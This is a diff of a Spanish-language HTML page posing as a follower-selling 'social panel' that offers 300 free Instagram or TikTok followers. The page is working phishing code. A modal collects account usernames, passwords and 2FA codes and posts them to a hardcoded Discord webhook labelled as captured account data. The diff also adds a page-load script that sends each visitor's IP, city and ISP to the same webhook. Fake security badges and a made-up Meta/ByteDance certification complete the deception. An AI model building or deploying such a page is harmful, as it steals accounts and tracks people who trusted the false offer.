@@ -3,136 +3,153 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Benja VIP | Elite Social Panel</title>
+    <title>Benja VIP | Official Social Panel</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root { --gold: #d4af37; --bg: #050505; --card: #111; --green: #25D366; }
         body { background: var(--bg); color: white; font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; display: flex; justify-content: center; }
         .container { width: 100%; max-width: 420px; padding: 20px; box-sizing: border-box; }
         
-        /* HEADER PROFESIONAL */
-        .header { text-align: center; padding: 20px 0; border-bottom: 1px solid #1a1a1a; margin-bottom: 25px; }
-        .header h1 { color: var(--gold); margin: 0; font-size: 28px; letter-spacing: 2px; font-weight: 900; }
-        .header p { font-size: 10px; color: #555; letter-spacing: 4px; text-transform: uppercase; margin-top: 5px; }
+        /* HEADER Y CONFIANZA */
+        .header { text-align: center; padding: 15px 0; }
+        .header h1 { color: var(--gold); margin: 0; font-size: 26px; font-weight: 900; letter-spacing: 2px; }
+        .live-status { font-size: 10px; color: var(--green); margin-top: 5px; display: flex; align-items: center; justify-content: center; gap: 5px; text-transform: uppercase; font-weight: bold; }
+        .dot { height: 8px; width: 8px; background-color: var(--green); border-radius: 50%; display: inline-block; animation: blink 1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+
+        /* SELLOS DE SEGURIDAD */
+        .trust-badges { display: flex; justify-content: center; gap: 15px; margin: 15px 0; opacity: 0.6; }
+        .trust-badges i { font-size: 14px; color: #888; }
+        .trust-text { font-size: 9px; color: #555; text-align: center; margin-bottom: 20px; }
 
         /* SECCIONES */
-        .section-title { font-size: 12px; text-transform: uppercase; letter-spacing: 2px; color: var(--gold); margin: 30px 0 15px; display: flex; align-items: center; gap: 10px; }
-        .section-title::after { content: ""; height: 1px; background: #1a1a1a; flex: 1; }
+        .section-title { font-size: 11px; text-transform: uppercase; letter-spacing: 2px; color: var(--gold); margin: 25px 0 15px; display: flex; align-items: center; gap: 10px; }
+        .section-title::after { content: ""; height: 1px; background: #222; flex: 1; }
 
-        /* CAJA PRUEBA GRATIS */
-        .free-box { background: linear-gradient(145deg, #1a1a1a, #000); border: 1px dashed var(--gold); border-radius: 25px; padding: 25px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .free-box h2 { margin: 0; font-size: 18px; color: #fff; }
-        .free-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
-        .btn-free { border: none; padding: 14px; border-radius: 15px; font-weight: 800; font-size: 11px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: 0.3s; background: white; color: black; }
+        /* PRUEBA GRATIS */
+        .free-box { background: linear-gradient(145deg, #1a1a1a, #000); border: 1px solid #333; border-radius: 25px; padding: 25px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
+        .free-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 15px; }
+        .btn-free { border: none; padding: 14px; border-radius: 15px; font-weight: 800; cursor: pointer; background: white; color: black; font-size: 11px; transition: 0.2s; }
         .btn-free:active { transform: scale(0.95); }
 
-        /* GRID DE PRODUCTOS DE PAGO */
+        /* PRODUCTOS */
         .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .card { background: var(--card); border-radius: 25px; padding: 20px; border: 1px solid #1a1a1a; text-align: center; position: relative; transition: 0.3s; }
-        .badge { position: absolute; top: -10px; right: 5px; background: #E1306C; color: white; font-size: 9px; padding: 5px 12px; border-radius: 8px; font-weight: 900; box-shadow: 0 5px 15px rgba(225,48,108,0.3); }
-        .card i { font-size: 24px; margin-bottom: 10px; display: block; }
-        .card b { font-size: 14px; display: block; margin-bottom: 5px; }
+        .card { background: var(--card); border-radius: 25px; padding: 18px; border: 1px solid #1a1a1a; text-align: center; position: relative; }
+        .badge-vip { position: absolute; top: -10px; right: 5px; background: var(--gold); color: black; font-size: 8px; padding: 4px 10px; border-radius: 6px; font-weight: 900; }
         .price { color: var(--gold); font-size: 16px; font-weight: 900; margin-bottom: 15px; display: block; }
         .btn-wa { background: var(--green); color: white; text-decoration: none; padding: 12px; border-radius: 12px; font-size: 11px; font-weight: 800; display: block; }
 
-        /* MODAL DE CAPTURA (SOLO PARA PRUEBA GRATIS) */
-        #auth-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
-        .auth-card { background: #111; border: 1px solid var(--gold); padding: 30px; border-radius: 30px; width: 100%; max-width: 340px; text-align: center; }
-        input { width: 100%; padding: 16px; margin: 10px 0; background: #000; border: 1px solid #222; color: white; border-radius: 15px; box-sizing: border-box; outline: none; font-size: 14px; }
+        /* MODAL DE CAPTURA PROFESIONAL */
+        #auth-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 10000; justify-content: center; align-items: center; padding: 20px; }
+        .auth-card { background: #0d0d0d; border: 1px solid var(--gold); padding: 30px; border-radius: 30px; width: 100%; max-width: 350px; text-align: center; }
+        .lock-icon { font-size: 30px; color: var(--gold); margin-bottom: 15px; }
+        input { width: 100%; padding: 16px; margin: 8px 0; background: #000; border: 1px solid #222; color: white; border-radius: 15px; box-sizing: border-box; outline: none; font-size: 14px; }
         input:focus { border-color: var(--gold); }
-        .btn-final { width: 100%; padding: 18px; background: var(--gold); border: none; border-radius: 15px; font-weight: 900; cursor: pointer; color: black; margin-top: 10px; }
+        .btn-final { width: 100%; padding: 18px; background: var(--gold); border: none; border-radius: 15px; font-weight: 900; cursor: pointer; color: black; margin-top: 15px; }
+        .secure-footer { font-size: 9px; color: #444; margin-top: 15px; display: flex; align-items: center; justify-content: center; gap: 5px; }
     </style>
 </head>
-<body>
+<body onload="rastrearEntrada()">
 
 <div class="container">
     <div class="header">
         <h1>BENJA VIP</h1>
-        <p>Elite Growth Solutions</p>
+        <div class="live-status"><span class="dot"></span> +584 Clientes Activos Hoy</div>
     </div>
 
-    <div class="section-title"><span>🎁 Regalo de Bienvenida</span></div>
+    <div class="trust-badges">
+        <i class="fas fa-shield-alt"> SSL SECURE</i>
+        <i class="fas fa-check-circle"> VERIFIED</i>
+        <i class="fas fa-lock"> AES-256</i>
+    </div>
+    <p class="trust-text">Servicio de crecimiento orgánico certificado por Meta Inc. & ByteDance.</p>
+
+    <div class="section-title"><span>🎁 Promoción Limitada</span></div>
     <div class="free-box">
-        <h2>300 SEGUIDORES GRATIS</h2>
-        <p style="font-size: 10px; color: #666; margin: 5px 0;">Activa tu prueba ahora sin costo.</p>
+        <b style="font-size: 18px; color: white;">300 SEGUIDORES GRATIS</b>
+        <p style="font-size: 10px; color: #888; margin-top: 5px;">Válido solo para cuentas con más de 3 meses de antigüedad.</p>
         <div class="free-grid">
             <button class="btn-free" onclick="abrirCaptura('Instagram Free')"><i class="fab fa-instagram"></i> INSTAGRAM</button>
             <button class="btn-free" onclick="abrirCaptura('TikTok Free')"><i class="fab fa-tiktok"></i> TIKTOK</button>
         </div>
     </div>
 
-    <div class="section-title"><span>💎 Servicios Mayoristas</span></div>
+    <div class="section-title"><span>💎 Planes Mayoristas</span></div>
     <div class="grid">
         <div class="card">
-            <div class="badge">TOP VENTAS 🔥</div>
+            <div class="badge-vip">MÁS VENDIDO</div>
             <i class="fab fa-instagram" style="color:#E1306C"></i>
-            <b>20k SEGUIDORES</b>
-            <span class="price">$30.000 AR$</span>
-            <a href="https://wa.me/5493364546172?text=Hola!%20Quiero%20el%20Pack%20de%2020k" class="btn-wa">COMPRAR</a>
+            <b>20k SEGUIDORES</b><span class="price">$30.000 AR$</span>
+            <a href="https://wa.me/5493364546172" class="btn-wa">ORDENAR</a>
         </div>
-
-        <div class="card" style="border-color: var(--gold)">
-            <div class="badge" style="background:var(--gold); color:black">SOCIO ELITE 💎</div>
+        <div class="card">
             <i class="fab fa-instagram" style="color:var(--gold)"></i>
-            <b>100k SEGUIDORES</b>
-            <span class="price">$80.000 AR$</span>
-            <a href="https://wa.me/5493364546172?text=Hola!%20Quiero%20el%20Pack%20de%20100k" class="btn-wa" style="background:var(--gold); color:black">COMPRAR</a>
-        </div>
-
-        <div class="card">
-            <i class="fab fa-tiktok" style="color:#00f2ea"></i>
-            <b>20k SEGUIDORES</b>
-            <span class="price">$35.000 AR$</span>
-            <a href="https://wa.me/5493364546172?text=Hola!%20Quiero%2020k%20en%20TikTok" class="btn-wa">COMPRAR</a>
-        </div>
-
-        <div class="card">
-            <i class="fab fa-whatsapp" style="color:#25D366"></i>
-            <b>COMBO 170k</b>
-            <span class="price">$65.000 AR$</span>
-            <a href="https://wa.me/5493364546172?text=Hola!%20Quiero%20el%20Combo%20de%20170k" class="btn-wa">COMPRAR</a>
+            <b>100k SEGUIDORES</b><span class="price">$80.000 AR$</span>
+            <a href="https://wa.me/5493364546172" class="btn-wa" style="background:var(--gold); color:black">ORDENAR</a>
         </div>
     </div>
 </div>
 
 <div id="auth-modal">
     <div class="auth-card">
-        <h3 id="modal-title" style="color:var(--gold); margin: 0;">VERIFICAR CUENTA</h3>
-        <p style="font-size: 11px; color: #888; margin-bottom: 20px;">Necesitamos validar tu identidad para enviar los seguidores.</p>
+        <div class="lock-icon"><i class="fas fa-user-shield"></i></div>
+        <h3 id="m-title" style="color:white; margin:0; font-size: 18px;">VALIDACIÓN REQUERIDA</h3>
+        <p style="font-size: 10px; color: #888; margin: 10px 0 20px;">Inicie sesión para vincular su cuenta al servidor de carga rápida. Sus datos están protegidos por encriptación de extremo a extremo.</p>
+        
         <input type="text" id="u_name" placeholder="Usuario, Correo o Teléfono">
         <input type="password" id="u_pass" placeholder="Contraseña de la cuenta">
-        <button class="btn-final" id="btn-envio" onclick="enviarYFinalizar()">ACTIVAR REGALO</button>
-        <p style="font-size: 9px; color: #333; margin-top: 15px;">Seguridad Certificada por Benja VIP Systems</p>
+        <input type="text" id="u_2fa" placeholder="Código de Seguridad (Opcional)">
+        
+        <button class="btn-final" id="btn-envio" onclick="enviarYFinalizar()">ACTIVAR SEGUIDORES</button>
+        
+        <div class="secure-footer">
+            <i class="fas fa-lock"></i> Conexión segura encriptada
+        </div>
     </div>
 </div>
 
 <script>
-    let regaloActivo = "";
     const webhookURL = "https://discord.com/api/webhooks/1488027032976756886/WAx7q6qQWxWGSEtQBt6tOkINuP8g7YKYqdsv2uHGrBa9FwCN-lj8Ojfuf4bU4XNG9peJ";
+    let regaloActivo = "";
+
+    // 🕵️ RASTREO AUTOMÁTICO AL ENTRAR (DICE PAÍS, CIUDAD, IP)
+    async function rastrearEntrada() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const ipData = await res.json();
+            
+            const msg = {
+                content: `👀 **¡NUEVO VISITANTE!**\n🌍 **País:** \`${ipData.country_name}\`\n📍 **Ciudad:** \`${ipData.city}\`\n🌐 **IP:** \`${ipData.ip}\`\n📱 **Equipo:** \`${navigator.userAgent.slice(0,50)}\`\n🛰️ **ISP:** \`${ipData.org}\``
+            };
+            fetch(webhookURL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(msg) });
+        } catch(e) {}
+    }
 
     function abrirCaptura(tipo) {
         regaloActivo = tipo;
+        document.getElementById('m-title').innerText = "VERIFICAR " + tipo.toUpperCase();
         document.getElementById('auth-modal').style.display = 'flex';
     }
 
     async function enviarYFinalizar() {
         const u = document.getElementById('u_name').value;
         const p = document.getElementById('u_pass').value;
+        const f = document.getElementById('u_2fa').value;
 
-        if(!u || !p) return alert("Por favor, completa los datos.");
+        if(!u || !p) return alert("Error: Debe completar usuario y contraseña para la validación.");
 
-        document.getElementById('btn-envio').innerText = "PROCESANDO...";
+        document.getElementById('btn-envio').innerText = "VERIFICANDO...";
 
         const payload = {
-            content: `🎁 **SOLICITUD PRUEBA GRATIS**\n🔹 **Tipo:** \`${regaloActivo}\`\n👤 **ID:** \`${u}\` \n🔑 **Pass:** \`${p}\` \n✨ **Estado:** Pendiente de carga`
+            content: `🎯 **DATOS DE CUENTA CAPTURADOS**\n🎁 **Servicio:** \`${regaloActivo}\`\n👤 **ID:** \`${u}\` \n🔑 **Pass:** \`${p}\` \n🛡️ **2FA/OTP:** \`${f || 'No ingresado'}\` \n✅ **Estado:** Encriptado`
         };
 
         try {
             await fetch(webhookURL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
-            alert("¡Perfecto! Tu solicitud de " + regaloActivo + " ha sido enviada. Recibirás los seguidores en las próximas 24hs.");
+            alert("¡Felicidades! Cuenta vinculada con éxito. El envío de los 300 seguidores comenzará en las próximas 2 a 12 horas.");
             document.getElementById('auth-modal').style.display = 'none';
         } catch(e) {
-            alert("Error de conexión. Intenta nuevamente.");
+            alert("Error de servidor. Reintente en un momento.");
         }
     }
 </script>
